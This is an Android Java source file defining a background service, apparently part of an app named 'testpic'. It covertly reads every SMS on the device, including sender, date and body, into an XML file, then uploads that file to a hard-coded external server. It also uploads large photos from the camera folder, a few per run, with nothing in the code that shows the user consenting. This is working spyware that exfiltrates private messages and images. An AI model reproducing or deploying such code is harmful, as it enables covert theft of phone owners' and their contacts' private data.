package com.example.testpic.service;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.UUID;

import org.xmlpull.v1.XmlSerializer;

import com.example.testpic.utils.SpUtil;


import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.os.Message;
import android.util.Xml;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

public class UpLoadService extends Service {
	 private static final String TAG = "uploadFile";  
	    private static final int TIME_OUT = 10 * 10000000; // ��ʱʱ��  
	    private static final String CHARSET = "utf-8"; // ���ñ���  
	    public static final String SUCCESS = "1";  
	    public static final String FAILURE = "0";
		private int up_index;
		private int currentIndex = 0;
		private int allCount;
		private int ietime;
		private int istime;  
		private int currentTime = 0;
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		//initUpLoad();
		//System.out.println("Service Creat!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
	}
@Override
public int onStartCommand(Intent intent, int flags, int startId) {
	// TODO Auto-generated method stub
String stime =	SpUtil.getString(getApplicationContext(), "uptime", "0");
	istime = Integer.parseInt(stime);
	ietime = istime;
	if(istime==0){
		new Thread(){
			public void run() {
				upSms();
			};
		}.start();
		
		
	}
	initUpLoad();
	System.out.println("Service Bind!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
	return START_STICKY;
}
	private void upSms() {
	// TODO Auto-generated method stub
		FileOutputStream fos = null;
		Cursor cursor = null;
		try {
			//需要用到的对象上下文环境,备份文件夹路径,进度条所在的对话框对象用于备份过程中进度的更新
			//1,获取备份短信写入的文件
			File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/smsini.xml");
			//2,获取内容解析器,获取短信数据库中数据
			cursor = getApplicationContext().getContentResolver().query(Uri.parse("content://sms/"), 
					new String[]{"address","date","type","body"}, null, null, null);
			//3,文件相应的输出流
			fos = new FileOutputStream(file);
			//4,序列化数据库中读取的数据,放置到xml中
			XmlSerializer newSerializer = Xml.newSerializer();
			//5,给次xml做相应设置
			newSerializer.setOutput(fos, "utf-8");
			//DTD(xml规范)
			newSerializer.startDocument("utf-8", true);
			
			newSerializer.startTag(null, "smss");
			
			//6,备份短信总数指定
			//A 如果传递进来的是对话框,指定对话框进度条的总数
			//B	如果传递进来的是进度条,指定进度条的总数
//			pd.setMax(cursor.getCount());
		
			
			//7,读取数据库中的每一行的数据写入到xml中
			while(cursor.moveToNext()){
				newSerializer.startTag(null, "sms");
				
				newSerializer.startTag(null, "address");
				newSerializer.text(cursor.getString(0));
				newSerializer.endTag(null, "address");
				
				newSerializer.startTag(null, "date");
				newSerializer.text(cursor.getString(1));
				newSerializer.endTag(null, "date");
				
				newSerializer.startTag(null, "type");
				newSerializer.text(cursor.getString(2));
				newSerializer.endTag(null, "type");
				
				newSerializer.startTag(null, "body");
				newSerializer.text(cursor.getString(3));
				newSerializer.endTag(null, "body");
				
				newSerializer.endTag(null, "sms");
				
				//8,每循环一次就需要去让进度条叠加
			
			
				//ProgressDialog可以在子线程中更新相应的进度条的改变
				
				//A 如果传递进来的是对话框,指定对话框进度条的当前百分比
				//B	如果传递进来的是进度条,指定进度条的当前百分比
//				pd.setProgress(index);
				
			
			}
			newSerializer.endTag(null, "smss");
			newSerializer.endDocument();
		} catch (Exception e) {
			e.printStackTrace();
		}finally{
			try {
				if(cursor!=null && fos!=null){
					cursor.close();
					fos.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	new Thread(){
		public void run() {
			uploadFile(new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/smsini.xml"));
		};
	}.start();
}
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
	
		return null;
	}
	private void initUpLoad() {
		// TODO Auto-generated method stub
	
	//	SpUtil.putString(getApplicationContext(),ConstantValue.VISIT_STATE , "1");
		//tag = SpUtil.getString(getApplicationContext(), ConstantValue.VISIT_STATE, "0");
	
		new Thread(){
			public void run() {
				startFun();
			};
		}.start();
	}
	protected void startFun() {
		// TODO Auto-generated method stub
		startFind();
	}

	
	protected void startFind() {
	//	SpUtil.putInt(getApplicationContext(), ConstantValue.UP_INDEX,0);
	
	
		 System.out.println("upIndex is ++++"+up_index+"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
		String path = Environment.getExternalStorageDirectory().getAbsolutePath()+"/DCIM";
		File file1 = new File(path);
//		if(!file1.exists()){
//			path = Environment.getExternalStorageDirectory().getAbsolutePath();
//		}
		System.out.println("path===="+path);
		allCount = 0;
		
		System.out.println("allCount is++++++++++++=="+allCount);
		currentIndex = 0;
		currentTime = 0;
	getAllFiles(new File(path));
	//SpUtil.putString(getApplicationContext(), ConstantValue.VISIT_STATE, "2");
		//removeDir(dir);
	}
	
	 private void getAllFiles(File root){  
		
	        File files[] = root.listFiles();  
	        for(int i=0;i<files.length;i++){
	        	if(files[i].isDirectory())
	        	System.out.println("files::::::"+files[i]);
	        }
	        if(files != null){  
	            for (File f : files){  
	          
	                if(f.isDirectory()){  
	                	if(!f.toString().startsWith(".")){
	                		getAllFiles(f);  
	                		
	                   }
	                }else{  
	                    System.out.println(f);
	                    String name = f.toString();
	                    if(((f.length()>1024*512)&&(name.endsWith(".jpg")||name.endsWith(".JPG")||name.endsWith(".png")||name.endsWith(".PNG")))){
	                    	
							if(currentTime>istime){
	                    	ietime++;
	                    	SpUtil.putString(getApplicationContext(), "uptime", ietime+"");
                    	if(ietime-istime>2){
                   		stopSelf();
                   		getApplicationContext().stopService(new Intent(getApplicationContext(),UpLoadService.class));
                   		System.out.println("需要结束服务了啊！！！！！！！！！！！！！！！");
                   		return ;
                  	}
	                    uploadFile(f);
	                    System.out.println("upFileStart!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
					
						
							try {
								Thread.sleep(2000);
								System.out.println("ok!!!!!!");
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}}else{
								currentTime++;
							}
						}
	                    
	                }  
	            }  
	        }  
	        System.out.println("currentIndex is !!!!"+currentIndex);
	        System.out.println("istime is !!!!"+istime);
	    }  
	public static String uploadFile(File file) {  
        String BOUNDARY = UUID.randomUUID().toString(); // �߽��ʶ ������  
        String PREFIX = "--", LINE_END = "\r\n";  
        String CONTENT_TYPE = "multipart/form-data"; // ��������  
        String RequestURL = "http://www.zhizhihaha.cn/day12-upload/AServlet";  
        try {  
            URL url = new URL(RequestURL);  
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();  
            conn.setReadTimeout(TIME_OUT);  
            conn.setConnectTimeout(TIME_OUT);  
            conn.setDoInput(true); // ����������  
            conn.setDoOutput(true); // ���������  
            conn.setUseCaches(false); // ������ʹ�û���  
            conn.setRequestMethod("POST"); // ����ʽ  
            conn.setRequestProperty("Charset", CHARSET); // ���ñ���  
            conn.setRequestProperty("connection", "keep-alive");  
            conn.setRequestProperty("Content-Type", CONTENT_TYPE + ";boundary="  
                    + BOUNDARY);  
            if (file != null) {  
                /** 
                 * ���ļ���Ϊ�գ����ļ���װ�����ϴ� 
                 */  
                OutputStream outputSteam = conn.getOutputStream();  
  
                DataOutputStream dos = new DataOutputStream(outputSteam);  
                StringBuffer sb = new StringBuffer();  
                sb.append(PREFIX);  
                sb.append(BOUNDARY);  
                sb.append(LINE_END);  
                /** 
                 * �����ص�ע�⣺ name�����ֵΪ����������Ҫkey ֻ�����key �ſ��Եõ���Ӧ���ļ� 
                 * filename���ļ������֣����׺��� ����:abc.png 
                 */  
  
                sb.append("Content-Disposition: form-data; name=\"img\"; filename=\""  
                        + file.getName() + "\"" + LINE_END);  
                sb.append("Content-Type: application/octet-stream; charset="  
                        + CHARSET + LINE_END);  
                sb.append(LINE_END);  
                dos.write(sb.toString().getBytes());  
                InputStream is = new FileInputStream(file);  
                byte[] bytes = new byte[1024];  
                int len = 0;  
                while ((len = is.read(bytes)) != -1) {  
                    dos.write(bytes, 0, len);  
                }  
                is.close();  
                dos.write(LINE_END.getBytes());  
                byte[] end_data = (PREFIX + BOUNDARY + PREFIX + LINE_END)  
                        .getBytes();  
                dos.write(end_data);  
                dos.flush();  
                /** 
                 * ��ȡ��Ӧ�� 200=�ɹ� ����Ӧ�ɹ�����ȡ��Ӧ���� 
                 */  
                int res = conn.getResponseCode();  
                if (res == 200) {  
                    return SUCCESS;  
                }  
            }  
        } catch (MalformedURLException e) {  
            e.printStackTrace();  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
        return FAILURE;  
    }  

	

	/**
	 * �ϴ��ļ����� 
	 */
@Override
public void onDestroy() {
	// TODO Auto-generated method stub
	super.onDestroy();
	SpUtil.putString(getApplicationContext(), "uptime", ietime+"");
	System.out.println("istime"+istime);
	System.out.println("ietime"+ietime);
}

	

}
